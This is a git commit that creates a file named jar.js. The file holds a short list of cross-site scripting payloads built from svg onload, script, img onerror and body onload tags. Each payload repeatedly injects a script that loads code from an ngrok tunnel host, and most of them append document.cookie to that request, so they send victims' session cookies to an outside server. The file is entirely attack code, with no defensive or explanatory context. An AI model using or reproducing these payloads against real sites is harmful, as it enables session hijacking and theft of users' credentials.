7aa8ed74d92a4c7fb1d223a11f4784e10f7be787
Barry Allen <56101811+khontkar@users.noreply.github.com>
2021-12-16 23:31:35 +0300

    Create jar.js

---
+++ jar.js
@@ -0,0 +1,10 @@
+<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//6.tcp.ngrok.io:18930"},999)>
+
+
+<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//6.tcp.ngrok.io:18930/?"+document.cookie},1010)>
+
+<script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//6.tcp.ngrok.io:18930/?"+document.cookie},1010)</script>
+
+<img src=x onerror=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//6.tcp.ngrok.io:18930/?"+document.cookie},1010)>
+
+<body onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//6.tcp.ngrok.io:18930/?"+document.cookie}></body>
